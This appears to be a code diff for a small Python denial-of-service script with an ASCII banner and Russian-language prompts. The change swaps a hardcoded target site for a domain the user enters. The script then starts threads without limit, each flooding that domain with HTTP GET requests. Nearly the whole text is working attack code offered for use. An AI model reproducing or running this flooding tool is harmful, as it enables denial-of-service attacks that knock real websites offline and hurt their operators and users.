@@ -13,11 +13,12 @@ print("""
 ╰╯╱╱╰━━┻━━┻╯╰┻━━━┻━━┻━━╯╰╯╰╯╰┻━━┻━━┻┻━┻━━╯
 
 """)
+ddos = input("Введите домен: ")
 input("Нажмите на Enter чтобы начать!")
 
 def dos():
  while True:
-  requests.get("https://vicecity-samp.ru")
+  requests.get(str(ddos))
   
 while True:
  threading.Thread(target=dos).start()
